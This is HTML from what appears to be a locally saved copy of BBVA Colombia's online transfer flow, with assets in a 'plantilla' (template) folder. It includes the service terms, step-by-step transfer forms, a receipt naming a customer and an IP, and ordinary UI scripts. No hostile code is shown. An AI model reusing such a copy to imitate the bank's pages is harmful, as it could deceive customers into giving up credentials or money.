                                </a>
                                <br></div><div id="conoritaThemeform:check-coronita-v2" class="ui-selectbooleancheckbox ui-chkbox ui-widget check__coronitaV2"><div class="ui-helper-hidden-accessible"><input id="conoritaThemeform:check-coronita-v2_input" name="conoritaThemeform:check-coronita-v2_input" type="checkbox" autocomplete="off" aria-hidden="true" aria-checked="false" onchange="PrimeFaces.ab({s:&quot;conoritaThemeform:check-coronita-v2&quot;,e:&quot;change&quot;,p:&quot;conoritaThemeform:check-coronita-v2&quot;,u:&quot;conoritaThemeform:buttonAdd&quot;});"></div><div class="ui-chkbox-box ui-widget ui-corner-all ui-state-default"><span class="ui-chkbox-icon ui-icon ui-icon-blank ui-c"></span></div></div><label id="conoritaThemeform:j_idt132" class="ui-outputlabel ui-widget check-label__coronitaV2" style="position: static !important;" for="conoritaThemeform:check-coronita-v2_input">Leí y acepto los Términos y Condiciones.
                            </label>

                            <div class="buttons"><span id="conoritaThemeform:buttonAdd" class="ui-commandlink ui-widget ui-state-disabled btn btn-blue btn-full ui-inputfield">Continuar</span>
                            </div>
                        </div>
                    </div></div>

                <div class="modal fade modal-md out" id="m-tyc" tabindex="-1" role-dialog="">
                    <div class="modal-dialog modal-sm" role="document">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h1>Términos y Condiciones</h1>

            

                            </div>
                            <div class="modal-body">

                                <div class="scrollhidden">
                                    <div>
                                        <p style="text-align: center">
                                            <strong>TÉRMINOS Y CONDICIONES DEL SERVICIO
                                                "INSCRIPCION DE CUENTAS Y CONTRATOS BENEFICIARIOS DE
                                                TRANSFERENCIAS Y PAGOS"</strong>
                                        </p>
                                        <p>El presente documento adiciona y forma parte integral de
                                            los contratos suscritos y actualmente vigentes entre el BANCO
                                            BILBAO VIZCAYA ARGENTARIA COLOMBIA S.A. "BBVA", en adelante EL
                                            BANCO y sus clientes personas naturales , en adelante EL
                                            CLIENTE. Queda entendido que “LOS CONTRATOS” relaciona todos
                                            aquellos productos y servicios que EL BANCO ofrece y aceptan
                                            sus clientes.</p>
                                        <p>La utilización del servicio "Inscripción de Cuentas y
                                            Contratos beneficiarios de transferencias y pagos", en
                                            adelante EL SERVICIO, implica la aceptación por parte de EL
                                            CLIENTE de los siguientes términos y condiciones:</p>
                                        <p>1. Este es un servicio ofrecido por EL BANCO a solicitud
                                            del CLIENTE, que consiste en la inscripción de cuentas,
                                            créditos o tarjetas de créditos pertenecientes a terceras
                                            personas, clientes del BBVA o de otros establecimientos de
                                            crédito, en adelante “CUENTAS BENEFICIARIAS”, que están siendo
                                            autorizadas por EL CLIENTE, bajo su exclusiva responsabilidad,
                                            para la realización de transferencias de fondos o pagos que
                                            sean ordenados por EL CLIENTE con débito de sus cuentas, a
                                            través de los servicios de Banca a Distancia: BBVA net, VIP
                                            BBVA net, Línea BBVA o cualquier otro medio de Banca
                                            Electrónica que sea ofrecido y comunicado por EL BANCO, en
                                            adelante BANCA A DISTANCIA.</p>
                                        <p>2. Con la aceptación de los presentes términos y
                                            condiciones del servicio, el CLIENTE autoriza al BANCO para
                                            que las "transferencias a terceros con cuenta en BBVA",
                                            "transferencias a otros establecimientos de crédito", "pago de
                                            créditos a terceros", "pago de tarjetas de crédito de terceros
                                            BBVA" y "pago de tarjetas propias y de terceros de otros
                                            establecimientos de crédito", sean originadas desde una de sus
                                            cuentas, con destino UNICAMENTE hacia las CUENTAS
                                            BENEFICIARIAS que el CLIENTE previamente inscriba y autorice,
                                            a través los medios habilitados por el Banco para este fin,
                                            como son: Red de oficinas BBVA y . BANCA A DISTANCIA.</p>
                                        <p>3. Están facultadas para solicitar el presente servicio
                                            las personas naturales titulares principales de los CONTRATOS
                                            y que sean usuarios de los productos y servicios de BANCA A
                                            DISTANCIA que emitan la autorización prevista en el numeral 2
                                            anterior.</p>
                                        <p>4. A través de este servicio, EL CLIENTE, en cualquier
                                            momento podrá autorizar una nueva CUENTA BENEFICIARIA o la
                                            cancelación de una cuenta previamente autorizada</p>
                                        <p>5. Cuando haya lugar a la cancelación de una CUENTA
                                            BENEFICIARIA, las operaciones que hayan sido ordenadas o
                                            programadas antes de esta cancelación, deberán ser ejecutadas
                                            por el Banco. En estos casos, el CLIENTE es el responsable de
                                            suprimir una a una las operaciones programadas hacia esas
                                            cuentas. En el evento de existir operaciones programadas antes
                                            de la solicitud del servicio, EL BANCO estará facultado para
                                            realizarlas sin importar si las cuentas beneficiaras hayan
                                            sido inscritas.</p>
                                        <p>6. Las CUENTAS BENEFICIARIAS que sean inscritas a través
                                            de los servicios BBVA net y VIP BBVA net, estarán sometidas a
                                            un proceso de validación y verificación por parte del BANCO y
                                            durante ese proceso serán consideradas como "Pendiente de
                                            Aprobación ". El BANCO podrá NEGAR la solicitud de inscripción
                                            de una CUENTA BENEFICIARIA si los datos suministrados no
                                            garantizan la correcta autenticación del CLIENTE. En todo
                                            caso, si no es posible para EL BANCO validar las cuentas
                                            dentro de los cinco (5) días hábiles siguientes a su
                                            inscripción, estas no serán habilitadas. Las CUENTAS
                                            BENEFICIARIAS que sean aprobadas por EL BANCO serán
                                            consideradas como "Activas" y aptas para realizar las
                                            operaciones bancarias indicadas en el numeral 2.</p>
                                        <p>7. EL BANCO se reserva el derecho de suspender o
                                            cancelar cualquiera de las CUENTAS BENEFICIARIAS inscritas por
                                            EL CLIENTE que presenten situación "Activa", con el sólo aviso
                                            con cinco hábiles días de antelación sin que haya lugar al
                                            pago de indemnización alguna.</p>
                                        <p>8. El Banco sólo será responsable de realizar las
                                            transferencias y pagos únicamente a las CUENTAS BENEFICIARIAS
                                            que sean ordenadas por EL CLIENTE mediante el ingreso de su
                                            clave de operaciones.</p>
                                        <p>9. EL BANCO es ajeno a cualquier negocio o convenio
                                            celebrado entre los terceros titulares o autorizados de las
                                            CUENTAS BENEFICIARIAS y EL CLIENTE. Por lo tanto, el BANCO
                                            queda libre de cualquier responsabilidad frente a terceros,
                                            como consecuencia errores u omisiones en la información
                                            registrada por EL CLIENTE para la ejecución de las operaciones
                                            que sean ordenadas.</p>
                                        <p>10. EL BANCO no es responsable de validar la información
                                            de los pagos que realice EL CLIENTE a través del Servicio, por
                                            lo tanto, no será responsable de ninguno de los datos
                                            suministradas por EL CLIENTE.</p>
                                        <p>11. Los horarios en que EL CLIENTE podrá tener acceso a
                                            EL SERVICIO se darán a conocer a través del Help Desk, la
                                            Línea BBVA, publicidad impresa, en la WEB del BANCO o bien,
                                            electrónicamente a través del propio servicio.</p>
                                        <p>12. EL BANCO no estará obligado a prestar el servicio,
                                            en los siguientes casos: a) Cuando la información transmitida
                                            sea insuficiente, inexacta, errónea o incompleta. b) Cuando
                                            "LAS CUENTAS BENEFICIARIAS" no se encuentren habilitadas en el
                                            servicio o se encuentren canceladas, salvo lo previsto en el
                                            numeral 5. c) Por causa de caso fortuito o fuerza mayor, o por
                                            cualquier causa ajena al control de EL BANCO.</p>
                                        <p>13. EL CLIENTE acepta expresamente que EL BANCO no será
                                            responsable de los daños y perjuicios que se le pudieran
                                            causar si, por caso fortuito, fuerza mayor o por cualquier
                                            otro acontecimiento o circunstancia inevitable no imputable al
                                            BANCO, EL CLIENTE no pudiera hacer uso del servicio o realizar
                                            alguna de las operaciones previstas en este contrato. En tal
                                            caso EL CLIENTE podrá hacer uso del servicio a través de los
                                            procedimientos de contingencia que le señalen en el Help Desk,
                                            Línea BBVA, o en la Red de oficinas.</p>
                                        <p>14. EL BANCO se reserva el derecho de efectuar
                                            modificaciones a los términos y condiciones de este contrato,
                                            bastando para ello un aviso a EL CLIENTE, ya sea por escrito,
                                            a través de la página WEB, o por medios electrónicos según
                                            corresponda, con el sólo aviso con cinco (5) días hábiles de
                                            antelación. La aceptación de la misma se entenderá si EL
                                            CLIENTE utiliza EL SERVICIO después de que éstas hayan entrado
                                            en vigor.</p>
                                        <p>15. Las condiciones vigentes de este SERVICIO y de los
                                            CONTRATOS, los límites y topes diarios, estarán disponibles
                                            para EL CLIENTE, por medios electrónicos, en los portales
                                            transaccionales del BANCO, en la página correspondiente a EL
                                            SERVICIO y se entienden notificados por dichos medios y
                                            aceptados por la utilización del SERVICIO.</p>
                                        <p>16. Lo no previsto en el presente Reglamento se regirá
                                            por las estipulaciones de LOS CONTRATOS celebrados entre EL
                                            BANCO y EL CLIENTE.</p>
                                    </div>
                                </div>
                                <div class="row buttons ">
                                    <div class="col-md-8 col-md-offset-2"></div>

                                </div>
                            </div>
                        </div>
                    </div>
                </div></div><div id="conoritaThemeform:stepnumber-3" class="ui-outputpanel ui-widget step" style="height: 657px;">
                <div data-context="MONTO_TRANSFERENCIA"></div>
                <div class="container">
                    <h3 class="step-identifier">3 de 7</h3>
                    <h1>Valor a transferir</h1>
                    <div class="row">
                        <div class="col-sm-12 col-md-6">
                            <div class="input-container__coronitaV2 cash-field  "><input id="conoritaThemeform:valueAmountToTransfer" name="conoritaThemeform:valueAmountToTransfer" type="text" autocomplete="off" maxlength="11" placeholder="Ingrese un monto" onkeydown="javascript:return formatNumber(this);" onkeypress="javascript:return isNumber(event);" onkeyup="PrimeFaces.bcn(this,event,[function(event){javascript:return formatNumber(this);},function(event){PrimeFaces.ab({s:&quot;conoritaThemeform:valueAmountToTransfer&quot;,e:&quot;keyup&quot;,p:&quot;conoritaThemeform:valueAmountToTransfer&quot;,u:&quot;conoritaThemeform:btn-submit-value-md&quot;});}])" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all input__coronitaV2" role="textbox" aria-disabled="false" aria-readonly="false">
                                <div class="inputerrorMessage">
                                    <h6>
                                        <i class="iconcoronita-alert"></i>
                                    </h6>
                                </div>
                            </div>

                            <div class="buttons" style="margin-top: 15px"><span id="conoritaThemeform:btn-submit-value-md" class="ui-commandlink ui-widget ui-state-disabled btn btn-blue btn-full                           ui-inputfield">Continuar</span>
                            </div>

                        </div>
                    </div>
                </div></div><div id="conoritaThemeform:stepnumber-4" class="ui-outputpanel ui-widget step" style="height: 657px;">
                <div data-context="PASO 4 de 7 Completa la información de la persona que recibirá el dinero"></div>
                <div class="container">
                    <h3 class="step-identifier">4 de 7</h3>
                    <h1>Completa la información de la <br>
                        persona que recibirá el dinero</h1>
                    <div class="row">
                        <div class="col-sm-12 col-md-6 form">
                            <div class="content-block">
                                <div class="select-container__coronitaV2"><div id="conoritaThemeform:selectDocumentTypeOption" class="ui-selectonemenu ui-widget ui-state-default ui-corner-all select__coronitaV2" role="combobox" aria-haspopup="true" aria-expanded="false" aria-owns="conoritaThemeform:selectDocumentTypeOption_items" style="min-width: 175px;"><div class="ui-helper-hidden-accessible"><input id="conoritaThemeform:selectDocumentTypeOption_focus" name="conoritaThemeform:selectDocumentTypeOption_focus" type="text" autocomplete="off" aria-expanded="false" aria-autocomplete="list" aria-activedescendant="conoritaThemeform:selectDocumentTypeOption_0" aria-describedby="conoritaThemeform:selectDocumentTypeOption_0" aria-disabled="false" placeholder="Tipo de Documento"></div><div class="ui-helper-hidden-accessible"><select id="conoritaThemeform:selectDocumentTypeOption_input" name="conoritaThemeform:selectDocumentTypeOption_input" tabindex="-1" aria-hidden="true" onchange="PrimeFaces.ab({s:&quot;conoritaThemeform:selectDocumentTypeOption&quot;,e:&quot;change&quot;,p:&quot;conoritaThemeform:selectDocumentTypeOption&quot;,u:&quot;conoritaThemeform:buttonIdentity conoritaThemeform:selectDocumentType&quot;,onco:function(xhr,status,args){initilizeCustomComponents();}});"><option value=""></option><option value="CC">Cedula de ciudadania</option><option value="CE">Cedula de extranjeria</option><option value="NIT">NIT</option><option value="TI">Tarjeta de identidad</option><option value="PA">Pasaporte</option><option value="NIP">NUIP</option><option value="CD">Carnet diplomatico</option></select></div><label id="conoritaThemeform:selectDocumentTypeOption_label" class="ui-selectonemenu-label ui-inputfield ui-corner-all">&nbsp;</label><div class="ui-selectonemenu-trigger ui-state-default ui-corner-right"><span class="ui-icon ui-icon-triangle-1-s ui-c"></span></div></div>
                                </div>
                                <div id="hasContent3" class="input required error">

                                    <div class="input-container__coronitaV2"><input id="conoritaThemeform:inputNameIdentity" name="conoritaThemeform:inputNameIdentity" type="text" autocomplete="off" maxlength="20" placeholder="Número de documento" onkeypress="javascript:return isNumber(event);" onkeyup="PrimeFaces.ab({s:&quot;conoritaThemeform:inputNameIdentity&quot;,e:&quot;keyup&quot;,p:&quot;conoritaThemeform:inputNameIdentity&quot;,u:&quot;conoritaThemeform:buttonIdentity&quot;});" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all input__coronitaV2" role="textbox" aria-disabled="false" aria-readonly="false">
                                    </div>
                                    <div class="inputerrorMessage">
                                        <h6>
                                            <i class="iconcoronita-alert"></i>
                                        </h6>
                                    </div>
                                </div><div id="conoritaThemeform:j_idt152" class="ui-outputpanel ui-widget">
                                    <script type="text/javascript">
                                        setTimeout(
                                            function () {
                                                document
                                                    .getElementById("hasContent3").classList
                                                    .add('error')
                                            }, 300);
                                    </script></div>
                            </div>
                            <div class="buttons" style="margin-top: -15px"><span id="conoritaThemeform:buttonIdentity" class="ui-commandlink ui-widget ui-state-disabled btn btn-blue btn-full                                     ui-inputfield">Continuar</span>
                            </div>
                        </div>
                    </div>
                </div></div><div id="conoritaThemeform:stepnumber-5" class="ui-outputpanel ui-widget step" style="height: 657px;">
                <div data-context="COMO_TRANSFERIR"></div>
                <div class="container">
                    <h3 class="step-identifier">5 de 7</h3>
                    <h1>¿Cómo quieres transferir?</h1>
                    <div class="row">
                        <div class="col-sm-12 col-md-6">
                            <div class="two-elements-container"><a id="conoritaThemeform:btnPlus" href="https://nuevaversion.bbvanet.com.co/bbva/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" class="ui-commandlink ui-widget option-card " onclick="PF(&#39;statusDialog&#39;).show();PrimeFaces.ab({s:&quot;conoritaThemeform:btnPlus&quot;,u:&quot;conoritaThemeform:btn-submit-value-no-client conoritaThemeform:pnlPpal conoritaThemeform:btnOthers conoritaThemeform:btnPlus&quot;,onco:function(xhr,status,args){PF(&#39;statusDialog&#39;).hide();}});return false;">
                                    <img src="./plantilla_files/img-starship.svg" alt="">
                                    <div class="textBlockCard">

                                        <span class="oc-highlight">Destacada</span>
                                        <h3 class="oc-title">Transferencia plus</h3>
                                        <p class="oc-description">Envía el dinero al instante invitando a tu contacto a BBVA
                                            móvil.</p>
                                        <span class="oc-label" style="">Tiempo: Al instante</span>
                                    </div></a>
                                <br><a id="conoritaThemeform:btnOthers" href="https://nuevaversion.bbvanet.com.co/bbva/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" class="ui-commandlink ui-widget option-card " onclick="PF(&#39;statusDialog&#39;).show();PrimeFaces.ab({s:&quot;conoritaThemeform:btnOthers&quot;,u:&quot;conoritaThemeform:btn-submit-value-no-client conoritaThemeform:pnlPpal conoritaThemeform:btnOthers conoritaThemeform:btnPlus&quot;,onco:function(xhr,status,args){PF(&#39;statusDialog&#39;).hide();}});return false;">
                                    <img src="./plantilla_files/img-sadface.svg" alt="">
                                    <div class="textBlockCard">

                                        <h3 class="oc-title">Transferencia a otro banco</h3>
                                        <p class="oc-description">Debes tener los datos de la persona y la información de la
                                            cuenta.</p>
                                        <span class="oc-label">Tiempo: 1 día hábil mínimo</span>
                                    </div></a>
                            </div>

                            <div class="buttons"><span id="conoritaThemeform:btn-submit-value-no-client" class="ui-commandlink ui-widget ui-state-disabled btn btn-blue btn-full btn-full-md ui-inputfield">Continuar</span>
                            </div>
                        </div>

                        <div class="col-md-5 col-sm-12 col-md-offset-1"><span id="conoritaThemeform:pnlPpal"><span id="conoritaThemeform:pnlNone">
                                    <div class="help blueLightWhite">
                                        <i class="iconcoronita-info"></i>
                                        <h6>Transfiere sin costo</h6>
                                        <p>Estos 2 tipos de transferencia son gratis, no te generarán ningún costo.</p>
                                    </div></span></span>
                        </div>
                    </div>
                </div></div><div id="conoritaThemeform:stepnumber-6" class="ui-outputpanel ui-widget step" style="height: 657px;">
                <div data-context="CUENTA_ORIGEN_TRANSFERENCIA"></div>
                <div class="helpMobile help mobile tablet">
                    <div class="container">
                        <div class="contain">
                            <h4>VALOR A TRANSFERIR</h4>
                            <h5><div id="conoritaThemeform:valueToTransfer" class="ui-outputpanel ui-widget">
                                    <span>$</span></div>
                            </h5>
                            <h6>Comisión:</h6>
                            <h6>
                                Sin comisión <img src="./plantilla_files/optimistic.svg" alt="">
                            </h6>
                        </div>
                    </div>
                </div>
                <div class="container">
                    <h3 class="step-identifier">6 de 7
                    </h3>
                    <h1 class="desktop">Vas a transferir desde:</h1>
                    <div class="row">
                        <div class="col-sm-12 col-md-6 grey100mob"><div id="conoritaThemeform:mainPnlProduct" class="ui-outputpanel ui-widget"><div id="conoritaThemeform:customPanelPersons" class="ui-outputpanel ui-widget" style="margin-bottom:10px"><span id="conoritaThemeform:customRadioPersons" class="ui-helper-hidden"></span></div>
                                <div class="c-paymentList" id="scrollContainerListFrom"><div id="conoritaThemeform:listPersonas" class="ui-outputpanel ui-widget"></div>
                                </div>

                                <div class="buttons"><span id="conoritaThemeform:btn-next-pl-sm" class="ui-commandlink ui-widget ui-state-disabled btn btn-blue btn-full btn-full-md ui-inputfield">Continuar</span>
                                </div></div>
                        </div>

                        <div class="col-md-5 col-sm-12 col-md-offset-1">
                            <div class="helpersGroup">
                                <div class="help grey100 desktop">
                                    <div class="contain editable">
                                        <h4>VALOR A TRANSFERIR</h4>
                                        <h5>
                                            <span>$</span>
                                        </h5>
                                    </div><a id="conoritaThemeform:boton-paso-2" href="https://nuevaversion.bbvanet.com.co/bbva/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" class="ui-commandlink ui-widget" onclick="PrimeFaces.ab({s:&quot;conoritaThemeform:boton-paso-2&quot;,e:&quot;click&quot;,p:&quot;conoritaThemeform:boton-paso-2&quot;,u:&quot;conoritaThemeform:pasosForm&quot;});;PrimeFaces.ab({s:&quot;conoritaThemeform:boton-paso-2&quot;});return false;">
                                            <div class="modify">
                                                <span>Editar</span>
                                            </div></a>
                                </div>
                                <div class="help greenWhite desktop">
                                    <div class="contain">
                                        <h6>Comisión:</h6>
                                        <h6 class="value">
                                            Sin comisión <img src="./plantilla_files/optimistic.svg" alt="">
                                        </h6>
                                    </div>
                                </div>
                                <div class="help grey100 desktop">
                                    <div class="contain editable"><div id="conoritaThemeform:j_idt189" class="ui-outputpanel ui-widget">
                                            <h4>PERSONA QUE
                                                RECIBE</h4></div>
                                    </div><a id="conoritaThemeform:boton-paso-1" href="https://nuevaversion.bbvanet.com.co/bbva/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" class="ui-commandlink ui-widget" onclick="PrimeFaces.ab({s:&quot;conoritaThemeform:boton-paso-1&quot;,e:&quot;click&quot;,p:&quot;conoritaThemeform:boton-paso-1&quot;,u:&quot;conoritaThemeform:pasosForm&quot;});;PrimeFaces.ab({s:&quot;conoritaThemeform:boton-paso-1&quot;});return false;">
                                        <div class="modify">
                                            <span>Editar</span>
                                        </div></a>
                                    <div class="contain editable"><div id="conoritaThemeform:j_idt198" class="ui-outputpanel ui-widget">
                                            <p>
                                                
                                            </p></div><div id="conoritaThemeform:j_idt202" class="ui-outputpanel ui-widget">
                                            <h4>
                                                
                                            </h4></div>
                                    </div>
                                    <div class="modify">
                                        <p style="float: left">
                                        </p>
                                    </div>
                                </div>
                            </div>
                                <br>
                                <div class="help blueLightWhite ">
                                    <i class="iconcoronita-info"></i>
                                    <h6>Revisa los datos de tu contacto</h6>
                                    <p>Confirma que el número y el nombre de tu
                                        contacto coincidan, de lo contrario no realices
                                        la transferencia.</p>
                                </div>
                        </div>
                    </div>
                </div></div><div id="conoritaThemeform:stepnumber-7" class="ui-outputpanel ui-widget step" style="height: 657px;">

<input type="hidden" name="conoritaThemeform:profileComposite:confirmProfiles" value="conoritaThemeform:profileComposite:confirmProfiles">

        <div class="container">
        </div>
        <link href="./plantilla_files/activeProfile.css" rel="stylesheet" type="text/css"><input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="e2s1">
</div><div id="conoritaThemeform:stepnumber-8" class="ui-outputpanel ui-widget step" style="height: 657px;"><div id="conoritaThemeform:j_idt231" class="ui-outputpanel ui-widget">
                    <div data-context="INGRESO_TOKEN"></div></div></div><div id="conoritaThemeform:stepnumber-9" class="ui-outputpanel ui-widget step confirmation success-bg" style="height: 657px;">
                <div class="container">
                    <div class="col-sm-12 col-md-5">
                        <i class="iconcoronita-checkmark"></i>
                        <h1>Listo
                            Jhon </h1>
                        <h2>Finalizaste tu transferencia</h2>

                        <div class="desktop">
                            <div class="twoButtons"><a id="conoritaThemeform:j_idt253" href="https://nuevaversion.bbvanet.com.co/bbva/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" class="ui-commandlink ui-widget btn btn-blue btn-full btn-full-md goBeginningBtn" onclick="PF(&#39;statusDialog&#39;).show();PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt253&quot;,e:&quot;click&quot;,p:&quot;conoritaThemeform:j_idt253&quot;,u:&quot;conoritaThemeform:pasosForm header&quot;});;PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt253&quot;,onco:function(xhr,status,args){PF(&#39;statusDialog&#39;).hide();}});return false;">
                                    Hacer otra transferencia
                                </a><a id="conoritaThemeform:j_idt255" href="https://nuevaversion.bbvanet.com.co/bbva/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" class="ui-commandlink ui-widget btn-nobackground" onclick="PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt255&quot;,e:&quot;click&quot;,p:&quot;conoritaThemeform:j_idt255&quot;});;PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt255&quot;,onst:function(cfg){PF(&#39;statusDialog&#39;).show();},onco:function(xhr,status,args){PF(&#39;statusDialog&#39;).hide();}});return false;">
                                    Ir a mis productos
                                </a>
                                <span class="separator-line"></span><a id="conoritaThemeform:j_idt258" href="https://nuevaversion.bbvanet.com.co/bbva/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" class="ui-commandlink ui-widget btn-nobackground" onclick="printElement(&#39;receiptDiv&#39;);;PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt258&quot;,onst:function(cfg){PF(&#39;statusDialog&#39;).show();},onco:function(xhr,status,args){PF(&#39;statusDialog&#39;).hide();}});return false;">
                                    <i class="iconcoronita-print"></i>Imprimir
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-12 col-md-5 col-md-offset-2">
                        <div class="help recibo order2">
                            <img src="./plantilla_files/ticket.png" alt="" class="adjustment">
                            <div class="receipt" id="receiptDiv">
                                <img src="./plantilla_files/BBVA.svg" alt="BBVA">
                                <div class="receiptContent"><div id="conoritaThemeform:j_idt263" class="ui-outputpanel ui-widget">
                                        <h1>Transferencia exitosa</h1></div>
                                    <h2>
                                        <small>$</small>
                                    </h2>
                                    <h3>
                                        
                                    </h3>
                                    <h3>
                                        IP 190.232.106.47
                                    </h3>
                                </div>
                                <div class="receiptSummary">
                                    <div class="contain"><div id="conoritaThemeform:j_idt270" class="ui-outputpanel ui-widget">
                                            <h4>Persona que recibe</h4></div><div id="conoritaThemeform:j_idt276" class="ui-outputpanel ui-widget" style="width: 180px">
                                            <p>
                                                
                                                <br>
                                                
                                            </p></div>
                                    </div>
                                    <div class="contain">
                                        <h4>Producto origen</h4>
                                        <p>
                                            <br>
                                            •
                                        </p>
                                    </div><div id="conoritaThemeform:j_idt279" class="ui-outputpanel ui-widget contain">
                                        <h4>Comprobante</h4>
                                        <p></p></div>
                                </div>
                            </div>
                            <img src="./plantilla_files/ticket.png" alt="" class="adjustment transform">
                        </div>
                    </div>
                    <div class="mobile">
                        <div class="twoButtons"><a id="conoritaThemeform:j_idt282" href="https://nuevaversion.bbvanet.com.co/bbva/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" class="ui-commandlink ui-widget btn btn-next btn-above" onclick="PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt282&quot;,e:&quot;click&quot;,p:&quot;conoritaThemeform:j_idt282&quot;,u:&quot;conoritaThemeform:pasosForm header&quot;});;PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt282&quot;,onst:function(cfg){PF(&#39;statusDialog&#39;).show();},onco:function(xhr,status,args){PF(&#39;statusDialog&#39;).hide();initilizeCustomComponents();}});return false;">
                                Hacer otra transferencia
                            </a><a id="conoritaThemeform:j_idt284" href="https://nuevaversion.bbvanet.com.co/bbva/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" class="ui-commandlink ui-widget link" onclick="PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt284&quot;,e:&quot;click&quot;,p:&quot;conoritaThemeform:j_idt284&quot;});;PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt284&quot;,onst:function(cfg){PF(&#39;statusDialog&#39;).show();},onco:function(xhr,status,args){PF(&#39;statusDialog&#39;).hide();}});return false;">
                                <h2>Ir a mis productos</h2></a>
                            <span class="separator-line"></span><a id="conoritaThemeform:j_idt287" href="https://nuevaversion.bbvanet.com.co/bbva/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" class="ui-commandlink ui-widget btn-nobackground" onclick="printElement(&#39;receiptDiv&#39;);;PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt287&quot;,onst:function(cfg){PF(&#39;statusDialog&#39;).show();},onco:function(xhr,status,args){PF(&#39;statusDialog&#39;).hide();initilizeCustomComponents();}});return false;">
                                <i class="iconcoronita-print"></i>Imprimir
                            </a>
                        </div>
                    </div>
                </div></div><div id="conoritaThemeform:j_idt296" class="ui-outputpanel ui-widget">
    <div class="overlay">
        <div class="content">
            <img src="./plantilla_files/overlaySuccess.svg" alt="">
            <p>¡Activación exitosa!</p>
        </div>
    </div></div><div id="conoritaThemeform:j_idt299" class="ui-outputpanel ui-widget">
                <script>
                    if(loadComplete){
                        changeContext();
                    }
                </script></div><span id="conoritaThemeform:modal-error-panel">
                <div class="modal fade modal-md out m-error" tabindex="-1" id="error">
                    <div class="modal-dialog modal-sm" role="document">
                        <div class="modal-content">
                            <div class="modal-header"><a id="conoritaThemeform:j_idt302" href="https://nuevaversion.bbvanet.com.co/bbva/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" onclick="PrimeFaces.ab({s:this,e:&quot;action&quot;,p:&quot;conoritaThemeform:j_idt302&quot;,u:&quot;conoritaThemeform:pasosForm&quot;});;return false">
                                 
                            </div>
                            <div class="modal-body">
                                <div class="row">
                                    <div class="col-md-12 iconModal">
                                        <img src="./plantilla_files/error.svg" alt="">
                                    </div>
                                    <h1>Discúlpanos</h1><div id="conoritaThemeform:j_idt306" class="ui-outputpanel ui-widget">
                                        <div class="col-md-12">
                                            <p class="center">
                                                 <br class="desktop">
                                                
                                            </p>
                                        </div></div>
                                </div>
                                <div class="row buttons">
                                    <div class="col-md-8 col-md-offset-2"><a id="conoritaThemeform:submit-step-1" href="https://nuevaversion.bbvanet.com.co/bbva/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" onclick="jsf.util.chain(this,event,&#39;document.getElementById(\&#39;error\&#39;).style.display = \&#39;none\&#39;;&#39;,&#39;PrimeFaces.ab({s:this,e:&quot;action&quot;,p:&quot;conoritaThemeform:submit-step-1&quot;,u:&quot;conoritaThemeform:pasosForm&quot;});&#39;);return false" class="submit-step-1 modify">Reintentar</a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div></span>

            <div class="modal fade modal-md out" id="bmModal" tabindex="-1" role-dialog="">
                <div class="modal-dialog modal-sm" role="document">
                    <div class="modal-content">
                        <div class="modal-header">

                    
                        </div>
                        <div class="modal-body">
                            <div class="row">
                                <div class="col-md-12 iconModal">
                                    <img class="" src="./plantilla_files/error.svg" alt="">
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-md-12">
                                    <h1 class="center">
                                        Debes habilitarte para hacer<br class="desktop">
                                        operaciones en BBVA móvil
                                    </h1>
                                    <p class="center" style="margin-bottom: 0px">Habilita tu
                                        BBVA móvil ingresando en la aplicación en:</p>
                                    <h4 style="font-style: normal">Menú &gt; Perfil y ajustes &gt;
                                        Crear o cambiar contraseña de operaciones</h4>
                                </div>
                            </div>
                            <div class="row buttons ">
                                <div class="col-md-8 col-md-offset-2"><a id="conoritaThemeform:j_idt312" href="https://nuevaversion.bbvanet.com.co/bbva/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" class="ui-commandlink ui-widget submit-step-1 modify" onclick="document.getElementById(&#39;bmModal&#39;).style.display = &#39;none&#39;;;PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt312&quot;,onco:function(xhr,status,args){PF(&#39;statusDialog&#39;).hide();}});return false;">Entendido</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div></div>

        <script type="text/javascript">
       
            window.addEventListener("load", function (event) {
                goStepAnimation('0', false, '0%');
                moveTabs();
                initilizeCustomComponents();
                changeContext();
            })
			
            function moveTabs() {
                var tabsWidth = document.querySelector('.tabs').offsetWidth / 2;
                document.querySelector('.highlight').style.width = tabsWidth + 'px';
                document.querySelector('.highlight').style.left = document.querySelector('.tab.active').offsetLeft + 'px';
            }

            function removeModalById() {
                const el = document.getElementById('m-tyc');
                el.style.display = "none"

            }

            function removeModal2ById() {
                const el = document.getElementById('confirmElimination');
                el.style.display = "none";
            }

            function removeModal2ByIdOthers() {
                const el = document.getElementById('confirmEliminationOthers');
                el.style.display = "none";
            }

            var scrollGlob;

            function keepScroll() {
                var scrollItem = document.getElementById("scrollContainerList");
                var scroll = $(scrollItem).scrollTop();
                scrollGlob = scroll;
                $(scrollItem).scrollTop(scroll)

            }

            function goScroll() {
                var scrollItem = document.getElementById("scrollContainerList");
                $(scrollItem).scrollTop(scrollGlob);
            }

            var firstTry = true;

            function enableButton() {
